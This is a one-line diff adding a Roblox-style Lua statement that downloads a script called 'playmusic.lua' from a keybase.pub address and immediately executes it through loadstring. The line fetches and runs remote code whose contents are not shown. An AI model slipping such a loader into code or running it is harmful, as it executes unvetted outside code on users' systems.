@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ixss.keybase.pub/rblx/playmusic.lua", true))()
